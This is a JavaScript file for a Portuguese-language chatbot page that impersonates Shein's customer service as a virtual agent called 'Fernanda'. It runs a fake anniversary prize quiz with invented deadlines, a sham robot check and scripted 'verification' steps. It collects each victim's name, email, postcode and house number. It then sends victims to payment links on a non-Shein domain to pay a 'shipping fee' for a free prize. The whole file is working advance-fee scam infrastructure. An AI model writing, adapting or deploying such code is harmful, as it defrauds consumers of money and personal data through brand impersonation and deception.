const chatContainer = document.getElementById('chatContainer');
const statusElement = document.getElementById('status');
const notificationSound = document.getElementById('notificationSound');

let userName = ''; // Nome dinâmico
var produtoEscolhido = ''; // Variável para armazenar o produto escolhido
var endereco = '';
let cep = ''; // Nova variável para armazenar o CEP
let numeroCasa = ''; // Nova variável para armazenar o número da casa
let currentStep = 0;
let userAnswers = {};

// Avatar do bot
const botAvatar = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSkAjqAnSbh7A5TKwE4UufKtxh1zCYZ_a_sHAXr6c_cGi_lHHchBirLNShrl1hsmB6w4sQ&usqp=CAU';

// Data formatada em PT-BR
function dataAtualPtBr(timeZone = 'America/Sao_Paulo') {
  const now = new Date();
  return new Intl.DateTimeFormat('pt-BR', {
    weekday: 'long',
    day: '2-digit',
    month: 'long',
    year: 'numeric',
    timeZone
  }).format(now);
}

// CONSULTA REAL DE CEP COM API VIACEP
async function consultarCepViaApi(cep) {
    const cleanCep = cep.replace(/\D/g, '');
    if (cleanCep.length !== 8) {
        return null; // CEP inválido
    }

    try {
        const response = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
        const data = await response.json();
        if (data.erro) {
            return null; // CEP não encontrado
        }
        return data; // Retorna o objeto do endereço
    } catch (error) {
        console.error("Erro ao consultar CEP:", error);
        return null;
    }
}

// Fluxo de conversa (com placeholders dinâmicos)
var conversationFlow = [
         { type: 'bot', delay: 1000, content: '<span class="bold">Parabéns!</span> Você foi selecionada para o questionário <span class="bold">Shein 17 anos</span>...' },
  { type: 'bot', delay: 1500, content: 'Olá! Seja bem vinda ao <b>questionário premiado</b> em comemoração aos <b>17 anos da Shein!</b>' },
  { type: 'bot', delay: 1700, content: 'Sou a <b>Fernanda</b>, atendente virtual da <b>Shein</b> e vou te auxiliar no seu <b>questionário premiado!</b> 🥰' },
  { type: 'bot', delay: 1500, content: 'Antes de começarmos, veja a <b>matéria exclusiva</b> divulgada nos jornais sobre nosso questionário <b>premiado:</b>' },
  { type: 'bot', delay: 1500, content: '<div class="z-20 text-fade-in w-full" ><iframe id="embed-bubble-content" class="w-full h-full " src="https://iframe.vslplay.com/81e6496e-c95e-4703-b1a0-6755799a3aaf"></iframe></div>', type_text: 'video', duration: 35000 },
  { type: 'bot', delay: 3000, content: `Hoje ${dataAtualPtBr()}, é o último dia para <b>responder o questionário e resgatar a sua premiação</b> caso esteja qualificada.` },
  { type: 'bot', delay: 1000, content: 'Podemos iniciar o questionário?', buttons: ['Iniciar questionário agora!'] },
  { type: 'bot', delay: 1200, content: 'Antes de prosseguirmos, devo informar que o questionário é limitado a <b>1 resposta por Pessoa.</b>' },

{ type: 'bot', delay: 1000, content: 'Para começarmos, preciso que me informe somente o <b>seu primeiro nome:</b>', input: true, input_name: 'nome' },
  { type: 'bot', delay: 2000, content: '{userName}, em poucos minutos você poderá receber até <b>2.000 reais em itens da Shein!</b>🎊' },
  { type: 'bot', delay: 1500, content: 'Para concluirmos a sua participação no questionário premiado, precisamos do seu email:', input: true, input_name: 'email' },
  { type: 'bot', delay: 1500, content: 'Estamos validando sua participação em nosso questionário...' },
  { type: 'bot', delay: 1500, content: '<b>✅ Verificado!</b><br>Você está qualificada para nosso questionário!' },
  { type: 'bot', delay: 2000, content: '{userName}, podemos iniciar o questionário?', buttons: ['Sim'] },
  { type: 'bot', delay: 2000, content: 'Para confirmarmos que você <b>não é um robô</b>, marque a data que você está <b>respondendo esse questionário:</b>' },
  { type: 'bot', delay: 2000, content: `Opção 01 - ${dataAtualPtBr()}` },
  { type: 'bot', delay: 2000, content: 'Opção 02 - quarta-feira, 11 de outubro de 2024' },
  { type: 'bot', delay: 2000, content: 'Opção 03 - sexta-feira, 25 de junho de 2025' },
  { type: 'bot', delay: 1500, content: 'Qual opção está <b>correta?</b>', buttons: ['Opção 01', 'Opção 02', 'Opção 03'], correct: 'Opção 01', returnStep: 14 },
  { type: 'bot', delay: 1500, content: '<b>{userName}</b>, seja bem vinda ao <b>questionário premiado Shein</b>, o tempo de duração média é de <b>2 a 5 minutos</b>, vamos começar? ',buttons: ['Sim']},

      {
        type: 'bot',
        delay: 1500,
        image: 'https://storage.atendentebrasil.site/typebot/public/workspaces/cmfxdr7j0000lon1g47ubhqwm/typebots/vye79fbtightsxku3myajpei/blocks/whr17iofzsncb4j80wz5bqr2?v=1760032476611'
      },
      {
        type: 'bot',
        delay: 1500,
        content: '<b>Pergunta 01:</b><br>Você já adquiriu algum produto da <b>Shein?</b>',
        buttons: ['Sim, já sou cliente', 'Não, ainda não comprei']
      },
      {
        type: 'bot',
        delay: 1500,
        image: 'https://storage.atendentebrasil.site/typebot/public/workspaces/cmfxdr7j0000lon1g47ubhqwm/typebots/vye79fbtightsxku3myajpei/blocks/vr0i4kapj0a1cvtnwh3j7d71?v=1760032515362'
      },
      {
        type: 'bot',
        delay: 1000,
        content: 'O que mais te <b>chama atenção</b> em nossos produtos?',
        buttons: ['Qualidade', 'Tecnologia e inovação', 'Design', 'Suporte ao cliente', 'Outro']
      },
      {
        type: 'bot',
        delay: 1000,
        content: '<b>Agradecemos sua resposta!</b><br>Vamos para a próxima pergunta...'
      },
      {
        type: 'bot',
        delay: 1500,
        image: 'https://storage.atendentebrasil.site/typebot/public/workspaces/cmfxdr7j0000lon1g47ubhqwm/typebots/vye79fbtightsxku3myajpei/blocks/favoqbv0hyop245a71srq928?v=1760032553892'
      },
      {
        type: 'bot',
        delay: 1000,
        content: 'Pergunta 02:<br><br><span class="bold">Com que frequência você faz compras na Shein?</span>',
        buttons: ['Semanalmente', 'Mensalmente', 'A cada dois meses', 'Raramente']
      },

      {
        type: 'bot',
        delay: 1500,
        image: 'https://storage.atendentebrasil.site/typebot/public/workspaces/cmfxdr7j0000lon1g47ubhqwm/typebots/vye79fbtightsxku3myajpei/blocks/jmdt2mzy8qte9m5kcxwsxtl8?v=1760032580858'
      },
      {
        type: 'bot',
        delay: 1000,
        content: 'Pergunta 03:<br><br><span class="bold">Quais tipos de produtos você mais compra na Shein?</span>',
        buttons: ['Roupas femininas', 'Roupas masculinas', 'Roupas infantis', 'Calçados']
      },

      {
        type: 'bot',
        delay: 1500,
        image: 'https://storage.atendentebrasil.site/typebot/public/workspaces/cmfxdr7j0000lon1g47ubhqwm/typebots/vye79fbtightsxku3myajpei/blocks/rd8ps0sfdzpvfqcgmggn8bjt?v=1760032607869'
      },
      {
        type: 'bot',
        delay: 1000,
        content: 'Pergunta 04:<br><br><span class="bold">Quais são os fatores mais importantes para você ao escolher um produto na Shein?</span>',
        buttons: ['Preço', 'Qualidade', 'Estilo', 'Tendências da moda', 'Comentários de outros clientes']

      },
      {
        type: 'bot',
        delay: 1500,
        image: 'https://storage.atendentebrasil.site/typebot/public/workspaces/cmfxdr7j0000lon1g47ubhqwm/typebots/vye79fbtightsxku3myajpei/blocks/tivx6nkes3dwy2yt1c7dgjse?v=1760032639772'
      },
      {
        type: 'bot',
        delay: 1000,
        content: 'Pergunta 05:<br><br><span class="bold">Qual é a sua experiência geral de navegação no site/app da Shein?</span>',
        buttons: ['Muito fácil', 'Fácil', 'Neutra', 'Difícil', 'Muito dificil']

      },
      {
        type: 'bot',
        delay: 1500,
        image: 'https://storage.atendentebrasil.site/typebot/public/workspaces/cmfxdr7j0000lon1g47ubhqwm/typebots/vye79fbtightsxku3myajpei/blocks/nsj6qdv9buo8e2gi4ojk85ln?v=1760032680232'
      },
      {
        type: 'bot',
        delay: 1000,
        content: 'Pergunta 06:<br><br><span class="bold">Quão satisfeita você está com o tempo de entrega dos produtos da Shein?</span>',
        buttons: ['Muito satisfeita', 'Satisfeita', 'Neutra', 'Insatisfeita', 'Muito insatisfeita']

      },
      {
        type: 'bot',
        delay: 1500,
        image: 'https://storage.atendentebrasil.site/typebot/public/workspaces/cmfxdr7j0000lon1g47ubhqwm/typebots/vye79fbtightsxku3myajpei/blocks/i58hsdyyy3q0cq0cvdfzo351?v=1760032712684'
      },
      {
        type: 'bot',
        delay: 1000,
        content: 'Pergunta 07:<br><br><span class="bold">Quais estilos de roupa você gostaria de ver mais na Shein?</span>',
        buttons: ['Casual', 'Esportivo', 'Formal', 'Vintage', 'Alternativo']

      },
      {
        type: 'bot',
        delay: 1500,
        image: 'images/verificando.gif'
      },
      {
        type: 'bot',
        delay: 2500,
        content: '<b>Parabéns você completou todas as perguntas com sucesso! 😍 </b>'

      },
      {
        type: 'bot',
        delay: 1000,
        content: '<b>Escolha a opção abaixo de qual <b>produto você gostaria de ganhar:</b> </b>'

      },
      {
        type: 'bot',
        delay: 1000,
        content: '<b>Opcão 01:</b>'

      },

      {
        type: 'bot',
        delay: 1500,
        image: 'https://storage.atendentebrasil.site/typebot/public/workspaces/cmfxdr7j0000lon1g47ubhqwm/typebots/vye79fbtightsxku3myajpei/blocks/ffvo3huuxccikfss50syf8i2?v=1760032729181'
      },
      {
        type: 'bot',
        delay: 1000,
        content: '<b>Kits Maquiagem Shein</b> -  Valor de até <b>R$1.989,70.</b> '

      },
      {
        type: 'bot',
        delay: 1000,
        content: '<b>Opcão 02:</b>'

      },

      {
        type: 'bot',
        delay: 1500,
        image: 'https://storage.atendentebrasil.site/typebot/public/workspaces/cmfxdr7j0000lon1g47ubhqwm/typebots/vye79fbtightsxku3myajpei/blocks/bq80iyoglph7kofw7dabkww2?v=1760032751979'
      },
      {
        type: 'bot',
        delay: 1000,
        content: '<b>Escolha os Looks que desejar</b> - Tema Livre - Valor de até <b>R$1.992,00. </b> '

      },
      {
        type: 'bot',
        delay: 1000,
        content: '<b>Opcão 03:</b>'

      },

      {
        type: 'bot',
        delay: 1500,
        image: 'https://storage.atendentebrasil.site/typebot/public/workspaces/cmfxdr7j0000lon1g47ubhqwm/typebots/vye79fbtightsxku3myajpei/blocks/e9z1k8dgcpzojm7ho3hxrl67?v=1760032793494'
      },
      {
        type: 'bot',
        delay: 1000,
        content: '<b>Escolha os Looks que desejar</b> - Tema Livre - Valor de até <b>R$1.992,00. </b> '

      },
      {
        type: 'bot',
        delay: 1000,
        content: 'Qual opção você gostaria de ganhar?',
        buttons: ['Opção 01', 'Opção 02', 'Opção 03'],
        button_name: 'produtoEscolhido' // CORREÇÃO: Adicionado button_name para capturar a escolha
      },
      {
        type: 'bot',
        delay: 1600,
        content: 'Antes de prosseguirmos com <b>sua premiação</b>, veja o que <b>algumas pessoas</b> nos mandam diariamente 🥰 ',

      },
      {
        type: 'bot',
        delay: 1600,
        content: '<iframe id="embed-bubble-content" class="w-full h-full " src="https://www.youtube-nocookie.com/embed/v6iCFyNdjrI?autoplay=0&amp;controls=0&amp;disablekb=1&amp;playsinline=1&amp;cc_load_policy=0&amp;showinfo=0&amp;modestbranding=0&amp;rel=0&amp;loop=0&amp;fs=0&amp;widget_referrer=https%3A%2F%2Fatendimentoprivado.com%2F&amp;enablejsapi=1&amp;origin=https%3A%2F%2Fiframe.vslplay.com&amp;widgetid=1&amp;forigin=https%3A%2F%2Fiframe.vslplay.com%2F6b899dde-e319-46e4-b5b6-03d4c200c39b&amp;aoriginsup=1&amp;aorigins=https%3A%2F%2Fatendimentoprivado.com%2Chttps%3A%2F%2Fatendimentoprivado.com&amp;gporigin=https%3A%2F%2Fatendimentoprivado.com%2F&amp;vf=1"></iframe>',
        type_text: 'video', duration: 30000,
      },
      {
        type: 'bot',
        delay: 1600,
        content: '{userName}, por que você gostaria de ganhar o <b>{produtoEscolhido}</b> ?',
        input: true

      },
      {
        type: 'bot',
        delay: 1600,
        content: '<i>Aguarde alguns segundos enquanto eu verifico suas respostas... </i>',

      },
      {
        type: 'bot',
        delay: 1600,
        content: '✅ <b>Respostas verificadas!</b>',

      },
      {
        type: 'bot',
        delay: 1600,
        content: '🎉 Parabéns! Você está qualificada para ganhar  <b>{produtoEscolhido}</b>!',

      },
      {
        type: 'bot',
        delay: 1600,
        content: 'De acordo com as regras do nosso questionário premiado, os <b>{produtoEscolhido}</b> sairá por R$0,00. ',

      },
      {
        type: 'bot',
        delay: 1600,
        content: 'Isso mesmo, o aniversário é nosso e quem ganha é você!',

      },
      {
        type: 'bot',
        delay: 1600,
        content: '<b>Agora escreva abaixo suas cores preferidas. Exemplo:</b> Branco, cor claro ou escuro, rosa, etc. <br><b>Escreva com detalhes:</b> ',
        input: true
      },
      {
        type: 'bot',
        delay: 1600,
        content: '✅ Perfeito, {userName}!<br><b>Recebemos suas preferências com sucesso!</b><br>Agora nosso time está preparando uma seleção <b>exclusiva só pra você</b> – com  100% do seu gosto. 💖',

      },
      {
        type: 'bot',
        delay: 1600,
        content: 'Lembre-se que hoje é o <b>último dia</b> para <b>resgatar seu prêmio</b>, e caso você <b>não conclua a etapa a seguir</b> seu prêmio será <b>expirado</b> e dará oportunidade para outro participante. ',

      },
      {
        type: 'bot',
        delay: 1600,
        content: 'Você será <b>redirecionada</b> para uma <b>página onde deverá preencher suas informações de contato.</b><br>Em seguida, entrarei em <b>contato pessoalmente</b> com você para <b>confirmar as escolhas das roupas e o endereço de entrega<b>, além de alinhar os <b>detalhes do pagamento do frete</b> no prazo que preferir.',

      },
      {
        type: 'bot',
        delay: 1500,
        content: 'Para onde devemos enviar seu prêmio? Por favor, digite o seu <b>CEP (sem traços):</b>:',
        input: true,
        input_name: "cep"
      },
      // NOVO PASSO (Simulação de verificação e pedido do número)
      {
        type: 'bot',
        delay: 1600,
        content: '<i>Estamos verificando seu CEP...</i>',
      },
      // NOVO PASSO (Exibe o endereço encontrado e pede o número)
      {
        type: 'bot',
        delay: 1600,
        content: ' Encontramos o seguinte endereço: <br><b>{endereco}</b><br><br>Agora, por favor, digite o <b>número da sua casa/apartamento</b>:',
        input: true,
        input_name: "numeroCasa"
      },
      // PASSO (Confirmação do endereço)
      {
        type: 'bot',
        delay: 1600,
        content: 'Seu endereço completo está correto? <br><b>{endereco}</b>',
        buttons: ['Sim, está correto'], // Adicionado opção de erro
        button_name : 'confirmacaoEndereco',
        correct: 'Sim, está correto', 
        returnStep: 63 // CORREÇÃO: Volta para o passo de CEP (índice 62 + 1)
      },
      // PASSO (Originalmente 65)
      {
        type: 'bot',
        delay: 1500,
        image: 'https://storage.atendentebrasil.site/typebot/public/workspaces/cmfxdr7j0000lon1g47ubhqwm/typebots/vye79fbtightsxku3myajpei/blocks/fc231c2y88djlh3bmi6bs0r7?v=1760373533488'
      },
      // PASSO (Originalmente 66)
      {
        type: 'bot',
        delay: 1500,
        content: '{userName}, seus dados foram <b>salvos com sucesso!</b> Em breve sua premiação chegará ate você! 😍' 

      },
      // PASSO (Originalmente 67)


      {
        type: 'bot',
        delay: 1500,
        content: '<audio controls src="images/audio.mp3" autoplay style=""></audio>', 
        duration: 41000,
        buttons: ['Porque preciso pagar o frete ?']
      },
      {
        type: 'bot',
        delay: 1500,
        content: 'A Shein está realizando seu aniversário de 17 anos e queremos que você faça parte dessa comemoração! A Shein se reserva ao direito de premiar uma pequena parte das pessoas e fechar o questionário quando bem entender. '
      },
      {
        type: 'bot',
        delay: 1500,
        content: 'A entrega dos produtos da Shein é realizada por uma empresa TERCEIRIZADA, qual conseguimos um desconto em comemoração de 17 anos da empresa. Por fim, todos os nossos custos levando em conta produção e fábrica dos produtos ficará por nossa conta e você pagará somente o valor de custo de transporte da empresa terceirizada.',
        buttons: ['Prosseguir com o recebimento do prêmio']
    },
    {
        type: 'bot',
        delay: 1500,
        content: '{userName} por onde gostaria de acompanhar e receber o código de rastreio do seu prêmio?',
        buttons: ['Quero receber por email','Quero receber por Telefone ou WhatsApp'],
        button_name : 'rastreio',
    },
    {
        type: 'bot',
        delay: 1500,
        content: 'Tudo certo! Assim que finalizar o pagamento do frete você receberá o código de rastreio',
        
    },
    {
        type: 'bot',
        delay: 1500,
        content: '🎉<b>Parabéns</b> {userName}, seus dados foram <b>salvos com sucesso!</b> Em breve sua premiação chegará ate você! 😍 ',
    },
    {
        type: 'bot',
        delay: 1500,
        content: '{userName}, agora escolha o melhor frete para você! ',
    },
    {
        type: 'bot',
        delay: 1500,
        content: 'Calculando frete... (espere alguns segundos.) '
    },

 {
    type: 'bot',
    delay: 1500,
    content: '<a href="https://pay.securepagamentos.shop/xQBPZvR64KaZmVq" class="inline-block w-full text-left text-white text-sm font-normal py-3 px-4 rounded-full bg-[#598E71] hover:bg-green-800 transition-colors duration-200">R$ 39,85 - FRETE EXPRESS - Chega em 2 dias úteis</a>'
},

{
    type: 'bot',
    delay: 1500,
    content: '<a href="https://pay.securepagamentos.shop/DPXw3XeAQOkZzmp" class="inline-block w-full text-left text-white text-sm font-normal py-3 px-4 rounded-full bg-[#598E71] hover:bg-green-800 transition-colors duration-200">R$ 29,83 - FRETE FULL - Chega em 6 dias úteis.</a>'
}

];

// 🟢 Função para mostrar indicador de digitação
function showTypingIndicator() {
  // Esconde a logo e a animação de "digitando" até o vídeo terminar
  const existingLogos = document.querySelectorAll('.avatar-bubble');
  existingLogos.forEach(logo => {
    logo.style.visibility = 'hidden'; // Esconde todas as logos das mensagens anteriores
  });

  // Cria a nova logo para a próxima mensagem
  const typingDiv = document.createElement('div');
  typingDiv.className = 'message bot';
  typingDiv.id = 'typing-indicator';
  typingDiv.innerHTML = `
    <div class="avatar-bubble">
      <img src="${botAvatar}" alt="Bot">
    </div>
    <div class="bubble typing">
      <div class="typing-indicator"><span></span><span></span><span></span></div>
    </div>`;
  
  chatContainer.appendChild(typingDiv);

  // Rolamos a tela para o fundo
  scrollToBottom();
}

// 🔴 Função para remover indicador
function hideTypingIndicator() {
  statusElement.textContent = 'Online';
  const typingIndicator = document.getElementById('typing-indicator');
  if (typingIndicator) typingIndicator.remove();
}

// Função para tratar a fila de mensagens com vídeo
function handleVideoMessage(message) {
  // O conteúdo do vídeo é o HTML do iframe, que já está formatado para ser exibido
  const videoContent = message.content;

  // Cria a div da mensagem
  const videoMessageDiv = document.createElement('div');
  videoMessageDiv.className = 'message bot';
  
  // Cria a bolha de chat
  const bubbleDiv = document.createElement('div');
  bubbleDiv.className = 'bubble w-full'; // Adiciona a classe w-full para ocupar a largura total
  bubbleDiv.innerHTML = videoContent; // Insere o iframe/HTML do vídeo na bolha

  // Adiciona o avatar e a bolha à mensagem
  videoMessageDiv.innerHTML = `
    <div class="avatar-bubble"><img src="${botAvatar}" alt="Bot"></div>
    ${bubbleDiv.outerHTML}`;
  
  chatContainer.appendChild(videoMessageDiv);

  // Esconde o indicador de digitação
  hideTypingIndicator();
  
  // Rolamos a tela para o fundo
  scrollToBottom();
}

// 💬 Função principal para adicionar mensagens do bot
function addBotMessage(content, image = null, buttons = null, input = false, type_text = false, input_name = null, correct = false, returnStep = null, button_name = null, duration = null) {
  console.log(currentStep, content);
  hideTypingIndicator(); // Remove o indicador antes de processar a mensagem

  // Substitui {userName} dinamicamente
  if (content && content.includes('{userName}')) {
    content = content.replace('{userName}', userName || '');
  }

  // CORREÇÃO: Substitui {produtoEscolhido} dinamicamente
  if (content && content.includes('{produtoEscolhido}')) {
    content = content.replace('{produtoEscolhido}', produtoEscolhido || '');
  }

  // Substitui {endereco} e {numeroCasa}
  if (content && content.includes('{endereco}')) {
    content = content.replace('{endereco}', endereco || '');
  }
  if (content && content.includes('{numeroCasa}')) {
    content = content.replace('{numeroCasa}', numeroCasa || '');
  }

  // Para vídeo, chama a função dedicada e sai
  if (type_text === 'video') {
    handleVideoMessage({ content: content, delay: 30000 }); // O delay é tratado no processNextStep
    return; // Sai da função para não continuar com o fluxo normal
  }

  const messageDiv = document.createElement('div');
  // Verifica se o conteúdo é um link de frete ou um áudio para remover a bolha
  const isAudio = content?.includes('<audio') && content?.includes('controls');
  const isFullWidthLink = (content?.includes('<a href=') && content?.includes('w-full')) || isAudio;

  // Se for um link de largura total ou áudio, remove a classe 'bot' para evitar estilos de bolha
  messageDiv.className = isFullWidthLink ? 'message full-width-link' : 'message bot';

  // CORREÇÃO APLICADA AQUI: Permite que imagem e conteúdo coexistam na mesma bolha
  let imageHtml = image ? `<img src="${image}" alt="Imagem" style="max-width: 100%; height: auto; display: block; margin-bottom: 10px;">` : '';
  let contentHtml = content ? content : '';
  let bubbleContent = imageHtml + contentHtml;

  // NOVO: Injeta a classe 'compact-audio-player' no elemento <audio> se ele existir
  if (bubbleContent.includes('<audio') && bubbleContent.includes('controls')) {
    // Usa uma expressão regular mais flexível para encontrar a tag <audio> com controls
    bubbleContent = bubbleContent.replace(/<audio\s+([^>]*?)controls([^>]*?)>/i, (match, p1, p2) => {
        // Verifica se já existe um atributo class
        if (match.includes('class=')) {
            return match.replace(/class=["']([^"']*)["']/, 'class="$1 compact-audio-player"');
        } else {
            // Adiciona o atributo class
            return `<audio ${p1} controls class="compact-audio-player" ${p2}>`;
        }
    });
  }

  // Se for um link de largura total ou áudio, o HTML é simplificado para não incluir a bolha
  if (isFullWidthLink) {
    messageDiv.innerHTML = `
      <div class="avatar-bubble"><img src="${botAvatar}" alt="Bot"></div>
      <div class="full-content">${bubbleContent}</div>`; // Apenas o conteúdo, sem a bolha
  } else {
    // Para todos os outros casos (incluindo mensagens que pedem input), usa a bolha normal
    messageDiv.innerHTML = `
      <div class="avatar-bubble"><img src="${botAvatar}" alt="Bot"></div>
      <div class="bubble">${bubbleContent}</div>`; // Conteúdo normal com bolha
  }

  chatContainer.appendChild(messageDiv);

  // Rolamos a tela para o fundo após a mensagem ser adicionada
  scrollToBottom();

  // Adiciona botões, se houver
  if (buttons?.length) {
    // NOVO: Determina o delay para os botões. Se for áudio e tiver duration, usa a duration. Caso contrário, usa 300ms.
    let buttonDelay = 300;
    // NOVO: Usa a variável bubbleContent, que já tem a classe 'compact-audio-player' injetada
    if (bubbleContent?.includes('compact-audio-player') && duration) {
        buttonDelay = duration;
    }

    setTimeout(() => {
      const buttonGroup = document.createElement('div');
      buttonGroup.className = 'message user';

      buttons.forEach(buttonText => {
        const button = document.createElement('button');
        button.className = 'chat-button';
        button.textContent = buttonText;
        button.onclick = () => handleButtonClick(buttonText, button, correct, returnStep, button_name);
        buttonGroup.appendChild(button);
      });

      chatContainer.appendChild(buttonGroup);
      scrollToBottom();
    }, buttonDelay); // <-- Usa o delay calculado
  }

  // Adiciona input, se houver
  if (input) {
    setTimeout(() => {
      const inputContainer = document.createElement('div');
      inputContainer.className = 'input-container flex justify-end';
      inputContainer.innerHTML = `
<div class="w-full max-w-md">
  <form class="flex items-center bg-white rounded-full shadow-lg overflow-hidden">
    <input 
        id="userInput"
        type="text"
        placeholder="Digite sua resposta..."
        class="chat-input flex-1 px-6 py-3 text-gray-700 placeholder-gray-400 focus:outline-none"
    />
    <button 
        type="button" id="enviar-btn"
        class="bg-[#598E71] hover:bg-green-700 text-white font-bold px-6 py-3 transition-colors duration-200 rounded-full m-1"
    >
        Enviar
    </button>
  </form>
</div>

      `;
      document.body.appendChild(inputContainer);

      const inputElement = inputContainer.querySelector('#userInput');
      const enviarBtn = inputContainer.querySelector('#enviar-btn');

      inputElement.focus();

      // Remove listener anterior se existir
      enviarBtn.replaceWith(enviarBtn.cloneNode(true));
      const newEnviarBtn = inputContainer.querySelector('#enviar-btn');

      const submitResposta = async () => {
        const valor = inputElement.value.trim();
        if (!valor) return;

        // Lógica de tratamento de CEP
        if (input_name === 'cep') {
            const enderecoEncontrado = await consultarCepViaApi(valor);
            if (enderecoEncontrado) {
                cep = valor;
                // Formata o endereço para exibição
                // Separando o logradouro para poder inserir o número depois
                const logradouro = enderecoEncontrado.logradouro;
                const restanteEndereco = `Bairro: ${enderecoEncontrado.bairro}<br>Cidade: ${enderecoEncontrado.localidade}<br>Estado: ${enderecoEncontrado.uf}<br>CEP: ${enderecoEncontrado.cep}`;
                
                // Armazena o logradouro e o restante do endereço para uso posterior
                userAnswers['cep_logradouro'] = logradouro;
                userAnswers['cep_restante'] = restanteEndereco;
                
                // Armazena o endereço formatado sem o número na variável global 'endereco'
                endereco = `Rua: ${logradouro}<br>${restanteEndereco}`;
                
                // O fluxo avança para o próximo passo (pedido do número da casa)
                handleInputSubmit(valor);
                inputContainer.remove(); // Remove o input em caso de sucesso
            } else {
                // CEP inválido, exibe a mensagem de erro e MANTÉM o input ativo
                addBotMessage(`CEP inválido ou não encontrado: <b>${valor}</b>. Por favor, digite um CEP válido (com ou sem traço):`, null, null, false, null, null, null, null, null);
                inputElement.value = ''; // Limpa o campo de input
            }
        } else if (input_name === 'numeroCasa') {
            numeroCasa = valor;
            // Atualiza a variável 'endereco' com o número da casa antes de avançar
            // O endereço completo agora inclui o número para ser exibido no PASSO de confirmação
            const logradouro = userAnswers['cep_logradouro']; // Recupera o logradouro
            const restanteEndereco = userAnswers['cep_restante']; // Recupera o restante do endereço
            endereco = `Rua: ${logradouro}<br>Número: ${numeroCasa}<br>${restanteEndereco}`;
            
            handleInputSubmit(valor);
            inputContainer.remove(); // Remove o input em caso de sucesso
        } else {
            // Lógica original para outros inputs
            if (input_name === 'nome') {
                userName = valor;
            } else if (input_name === 'endereco') {
                endereco = valor;
            }

            if (input_name && input_name !== null) {
                userAnswers[input_name] = valor;
            }
            handleInputSubmit(valor);
            inputContainer.remove(); // Remove o input em caso de sucesso
        }
      };

      // Enter
      inputElement.addEventListener('keypress', e => {
        if (e.key === 'Enter') {
          e.preventDefault();
          submitResposta();
        }
      });

      // Clique
      newEnviarBtn.addEventListener('click', e => {
        e.preventDefault();
        submitResposta();
      });
    }, 300);
  }

 // notificationSound.play().catch(() => {});
  scrollToBottom();
}


// 👤 Mensagem do usuário
function addUserMessage(text) {
  const messageDiv = document.createElement('div');
  messageDiv.className = 'message user';
  messageDiv.innerHTML = `<div class="bubble">${text}</div>`;
  chatContainer.appendChild(messageDiv);
  scrollToBottom();
}

// 🖱️ Função para lidar com cliques em botões
function handleButtonClick(buttonText, buttonElement, correct, returnStep, button_name) {
  // Remove todos os botões após o clique
  const buttonGroup = buttonElement.closest('.message.user');
  if (buttonGroup) {
    buttonGroup.remove();
  }

  // Adiciona a mensagem do usuário
  addUserMessage(buttonText);

  // CORREÇÃO: Lógica para armazenar o produto escolhido
  if (button_name === 'produtoEscolhido') {
    produtoEscolhido = buttonText;
  }

  // Lógica de retorno para o passo de CEP em caso de endereço incorreto
  if (returnStep && buttonText !== correct) {
    currentStep = returnStep - 1; // -1 porque o processNextStep incrementa
  }

  // Armazena a resposta do botão
  if (button_name && button_name !== null) {
    userAnswers[button_name] = buttonText;
  }

  // Processa o próximo passo
  processNextStep();
}

// ➡️ Função para processar o próximo passo da conversa
function processNextStep() {
  if (currentStep >= conversationFlow.length) return;

  const step = conversationFlow[currentStep];
  
  // CORREÇÃO FINAL: Só mostra o indicador se NÃO for um vídeo
  if (step.type_text !== 'video' && !step.content?.includes('<audio controls=')) { // Adicionado '?' para evitar erro se 'content' for undefined
    showTypingIndicator();
  }

  setTimeout(() => {
    // Verifica se é uma mensagem do bot
    if (step.type === 'bot') {
      // NOVO: Passa step.duration para addBotMessage
      addBotMessage(step.content, step.image, step.buttons, step.input, step.type_text, step.input_name, step.correct, step.returnStep, step.button_name, step.duration);
      
      // Incrementa o currentStep para que o próximo passo seja o correto
      currentStep++;

      // AQUI ESTÁ O ERRO DE FLUXO QUE IMPEDE A IMAGEM DE APARECER
      // Se a mensagem tiver botões ou input, o fluxo DEVE parar e esperar a interação do usuário.
      // Se não tiver botões NEM input, o fluxo deve continuar automaticamente.
      if (!step.buttons && !step.input) {
        // Determina o delay para o próximo passo
        let nextStepDelay = step.delay || 1000; // Delay padrão
        
        // Se for vídeo ou áudio, usa o 'duration' como delay para o próximo passo
        if (step.type_text === 'video' || step.content?.includes('<audio controls=')) { // Adicionado '?' para evitar erro se 'content' for undefined
          nextStepDelay = step.duration || 30000; // Usa duration ou 30s como fallback
        }
        
        // Chama o processNextStep() após o delay
        setTimeout(() => {
          processNextStep();
        }, nextStepDelay);
      }
      // CORREÇÃO: Se houver botões ou input, o fluxo para e espera o clique/envio.
      // O processNextStep é chamado dentro de handleButtonClick ou handleInputSubmit.
      
    } else if (step.type === 'user') {
      // Se for uma mensagem do usuário, apenas a exibe e avança
      addUserMessage(step.content);
      currentStep++; // Incrementa o passo para mensagens do usuário
      processNextStep();
    }
  }, step.delay || 1000); // Usa o delay definido ou 1 segundo por padrão
}

// 📥 Função para lidar com o envio de input
function handleInputSubmit(value) {
  addUserMessage(value); // Exibe a resposta do usuário
  processNextStep(); // Continua para o próximo passo
}

// ⬇️ Função para rolar o chat para o final
function scrollToBottom() {
  setTimeout(() => {
    chatContainer.scrollTop = chatContainer.scrollHeight;
  }, 100);
}

// 🚀 Inicia a conversa
function startChat() {
  // Define o nome do usuário (simulação)
  userName = 'Usuário'; // Pode ser alterado para um nome real se houver um passo de coleta de nome

  // Adiciona a mensagem inicial
  processNextStep();
}

// 🖼️ Função para carregar a imagem de fundo
function loadBackgroundImage() {
  const imageUrl = './images/fundo.png'; // URL da imagem de fundo
  document.body.style.backgroundImage = `url('${imageUrl}')`;
  document.body.style.backgroundSize = 'cover';
  document.body.style.backgroundPosition = 'center';
  document.body.style.backgroundAttachment = 'fixed';
}

// 🏁 Inicialização
document.addEventListener('DOMContentLoaded', () => {
  loadBackgroundImage();
  startChat();
});
